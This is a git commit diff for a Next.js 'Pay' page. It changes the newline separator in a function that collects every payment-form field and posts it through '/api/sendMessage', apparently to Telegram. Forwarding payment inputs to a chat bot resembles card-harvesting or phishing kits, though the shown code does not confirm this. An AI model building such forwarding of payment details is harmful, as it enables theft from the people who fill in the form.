7f8f400e950f7fc83b55f5c2a3335f2ccc07a2ec
milad998 <myaralbwd20@gmail.com>
2025-08-26 23:53:46 +0300

    Update page.jsx

--- ‏‏my-app/src/app/fozajil/pay/page.jsx
+++ ‏‏my-app/src/app/fozajil/pay/page.jsx
@@ -37,7 +37,7 @@ const Pay=()=>{
   const PostToTelegram = async() => {
     const description = Object.entries(form.data)
       .map((d) => `${d[0]} : ${d[1]} `)
-      .join("%0A");
+      .join("\n");
     await fetch("/api/sendMessage", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
